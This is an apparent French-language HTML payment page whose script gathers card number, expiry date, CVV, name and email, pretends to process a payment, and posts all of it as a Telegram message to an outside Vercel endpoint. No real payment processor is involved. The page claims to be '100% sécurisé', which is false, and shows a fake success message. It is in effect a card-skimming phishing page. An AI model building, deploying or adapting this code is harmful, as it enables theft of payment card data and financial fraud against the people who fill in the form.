<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üí≥ Paiement S√©curis√© - CORRIG√â</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
        }
        
        .form-container {
            padding: 40px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        input, select {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #ff6b6b;
        }
        
        .card-row {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 15px;
        }
        
        .pay-button {
            width: 100%;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s ease;
            margin-top: 20px;
        }
        
        .pay-button:hover {
            transform: translateY(-2px);
        }
        
        .pay-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .test-buttons {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 15px;
        }
        
        .test-button {
            background: #007bff;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s ease;
        }
        
        .test-button:hover {
            background: #0056b3;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .result {
            margin-top: 20px;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            opacity: 0.7;
        }
        
        .badge {
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üí≥ Paiement S√©curis√©</h1>
            <p>Version corrig√©e - Fonctionne dans tous les navigateurs</p>
        </div>
        
        <div class="form-container">
            <form id="paymentForm">
                <div class="form-group">
                    <label for="amount">Montant (‚Ç¨) *</label>
                    <input type="number" id="amount" value="99.99" step="0.01" min="0.01" required>
                </div>
                
                <div class="form-group">
                    <label for="paymentMethod">M√©thode de paiement</label>
                    <select id="paymentMethod">
                        <option value="card">üí≥ Carte</option>
                        <option value="paypal">üÖøÔ∏è PayPal</option>
                        <option value="apple">üçé Apple Pay</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="cardNumber">Num√©ro de carte</label>
                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
                </div>
                
                <div class="card-row">
                    <div class="form-group">
                        <label for="expiry">Date d'expiration</label>
                        <input type="text" id="expiry" placeholder="MM/AA" maxlength="5">
                    </div>
                    
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <input type="text" id="cvv" placeholder="123" maxlength="3">
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="postalCode">Code postal</label>
                    <input type="text" id="postalCode" placeholder="75001">
                </div>
                
                <div class="form-group">
                    <label for="customerName">Nom sur la carte</label>
                    <input type="text" id="customerName" placeholder="Jean Dupont">
                </div>
                
                <div class="form-group">
                    <label for="email">Email de confirmation</label>
                    <input type="email" id="email" placeholder="jean@example.com">
                </div>
                
                <button type="submit" class="pay-button" id="payButton">
                    üí≥ Payer 99.99‚Ç¨
                </button>
                
                <div class="test-buttons">
                    <button type="button" class="test-button" onclick="testAPI()">
                        üß™ Tester API
                    </button>
                    <button type="button" class="test-button" onclick="testPayment()">
                        üí≥ Test Paiement
                    </button>
                </div>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Traitement du paiement...</p>
            </div>
            
            <div id="result"></div>
            
            <div class="security-badges">
                <div class="badge">üîí Paiement 100% s√©curis√© - Donn√©es chiffr√©es SSL</div>
                <div class="badge">üì± Notifications automatiques sur Telegram</div>
            </div>
        </div>
    </div>

    <script>
        const CACAPAY_API = 'https://test-alpha-lac-68.vercel.app/api/telegram';
        console.log('üöÄ Site de paiement CORRIG√â charg√© !');
        
        // Gestion du formulaire
        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            console.log('üöÄ Formulaire soumis !');
            await processPayment();
        });
        
        // Formatage automatique du num√©ro de carte
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });
        
        // Formatage automatique de la date d'expiration
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // Formatage automatique du CVV
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });
        
        // Mise √† jour automatique du montant dans le bouton
        document.getElementById('amount').addEventListener('input', function(e) {
            const payButton = document.getElementById('payButton');
            payButton.textContent = `üí≥ Payer ${e.target.value}‚Ç¨`;
        });
        
        // Fonction pour traiter le paiement
        async function processPayment() {
            try {
                console.log('üîÑ D√©but de processPayment()');
                
                // R√©cup√©rer les donn√©es du formulaire
                const paymentData = {
                    customerName: document.getElementById('customerName').value || 'Client',
                    email: document.getElementById('email').value || 'client@example.com',
                    amount: document.getElementById('amount').value || '99.99',
                    cardNumber: document.getElementById('cardNumber').value || '**** **** **** ****',
                    expiry: document.getElementById('expiry').value || 'MM/AA',
                    cvv: document.getElementById('cvv').value || '***'
                };
                
                console.log('üí≥ Traitement du paiement...', paymentData);
                
                // Afficher le loading
                showLoading(true);
                hideResult();
                
                // Simuler le traitement du paiement (1-2 secondes)
                await new Promise(resolve => setTimeout(resolve, 1500));
                
                // Envoyer la notification via l'API Vercel (CORRIG√â)
                const notificationResult = await sendCacapayNotification(paymentData);
                
                if (notificationResult.success) {
                    showSuccess(paymentData, notificationResult);
                } else {
                    showError('Erreur lors de l\'envoi de la notification: ' + notificationResult.error);
                }
                
            } catch (error) {
                console.error('Erreur paiement:', error);
                showError('Erreur lors du traitement du paiement: ' + error.message);
            } finally {
                showLoading(false);
            }
        }
        
        // Fonction pour envoyer une notification Cacapay
        async function sendCacapayNotification(paymentData) {
            try {
                console.log('üì§ Envoi de la notification...');
                
                const message = `üí∞ NOUVEAU PAIEMENT RE√áU !
üë§ Nom: ${paymentData.customerName}
üìß Email: ${paymentData.email}
üí≥ Carte: ${paymentData.cardNumber}
üìÖ Expiration: ${paymentData.expiry}
üîê CVV: ${paymentData.cvv}
üí∂ Montant: ${paymentData.amount}‚Ç¨
üîí V√©rifiez imm√©diatement !`;
                
                console.log('üìù Message √† envoyer:', message);
                console.log('üåê URL API:', CACAPAY_API);
                
                const response = await fetch(CACAPAY_API, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        message: message,
                        type: 'payment'
                    })
                });
                
                console.log('üì° R√©ponse re√ßue, statut:', response.status);
                const result = await response.json();
                console.log('üìÑ R√©sultat API:', result);
                
                if (result.success) {
                    console.log('‚úÖ Notification envoy√©e !', result.telegramResponse?.result?.message_id);
                    return { success: true, messageId: result.telegramResponse?.result?.message_id };
                } else {
                    console.error('‚ùå Erreur notification:', result.error);
                    return { success: false, error: result.error };
                }
            } catch (error) {
                console.error('‚ùå Erreur envoi notification:', error);
                return { success: false, error: error.message };
            }
        }
        
        // Fonction pour tester l'API
        async function testAPI() {
            try {
                console.log('üß™ Test de l\'API...');
                showResult('üîß Test de l\'API en cours...', false);
                
                const response = await fetch(CACAPAY_API, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        message: 'üß™ TEST API - ' + new Date().toLocaleTimeString(),
                        type: 'test'
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showResult(`‚úÖ API fonctionne !<br>Message ID: ${result.telegramResponse?.result?.message_id}<br>V√©rifiez votre Telegram !`, true);
                } else {
                    showResult(`‚ùå Erreur API: ${result.error}`, false);
                }
                
            } catch (error) {
                console.error('Erreur test API:', error);
                showResult('‚ùå Erreur test API: ' + error.message, false);
            }
        }
        
        // Fonction pour tester un paiement
        async function testPayment() {
            try {
                console.log('üí≥ Test de paiement...');
                showResult('üí≥ Test de paiement en cours...', false);
                
                const testData = {
                    customerName: 'Test Client',
                    email: 'test@example.com',
                    amount: '99.99',
                    cardNumber: '1234 **** **** 5678',
                    expiry: '12/25',
                    cvv: '123'
                };
                
                const result = await sendCacapayNotification(testData);
                
                if (result.success) {
                    showResult(`‚úÖ Test paiement r√©ussi !<br>Message ID: ${result.messageId}<br>V√©rifiez votre Telegram !`, true);
                } else {
                    showResult(`‚ùå Erreur test paiement: ${result.error}`, false);
                }
                
            } catch (error) {
                console.error('Erreur test paiement:', error);
                showResult('‚ùå Erreur test paiement: ' + error.message, false);
            }
        }
        
        // Fonctions d'affichage
        function showLoading(show) {
            const loading = document.getElementById('loading');
            const payButton = document.getElementById('payButton');
            
            if (loading) {
                loading.style.display = show ? 'block' : 'none';
            }
            
            if (payButton) {
                payButton.disabled = show;
                payButton.textContent = show ? '‚è≥ Traitement...' : 'üí≥ Payer 99.99‚Ç¨';
            }
        }
        
        function hideResult() {
            const result = document.getElementById('result');
            if (result) {
                result.innerHTML = '';
            }
        }
        
        function showSuccess(paymentData, notificationResult) {
            const result = document.getElementById('result');
            if (result) {
                result.innerHTML = `
                    <div class="success">
                        <h3>üéâ Paiement r√©ussi !</h3>
                        <p><strong>Client :</strong> ${paymentData.customerName}</p>
                        <p><strong>Email :</strong> ${paymentData.email}</p>
                        <p><strong>Montant :</strong> ${paymentData.amount}‚Ç¨</p>
                        <p><strong>Message ID :</strong> ${notificationResult.messageId}</p>
                        <p>üì± Notification envoy√©e sur Telegram !</p>
                        <p>‚úÖ V√©rifiez votre chat Telegram</p>
                    </div>
                `;
            }
        }
        
        function showError(message) {
            const result = document.getElementById('result');
            if (result) {
                result.innerHTML = `
                    <div class="error">
                        <h3>‚ùå Erreur</h3>
                        <p>${message}</p>
                    </div>
                `;
            }
        }
        
        function showResult(message, isSuccess = true) {
            const result = document.getElementById('result');
            if (result) {
                result.innerHTML = `<div class="${isSuccess ? 'success' : 'error'}">${message}</div>`;
            }
        }
        
        // Test automatique au chargement
        window.onload = function() {
            console.log('üöÄ Site de paiement corrig√© charg√© !');
            showResult('üöÄ Site de paiement corrig√© charg√© !<br>Pr√™t pour les tests !', true);
        };
    </script>
</body>
</html>
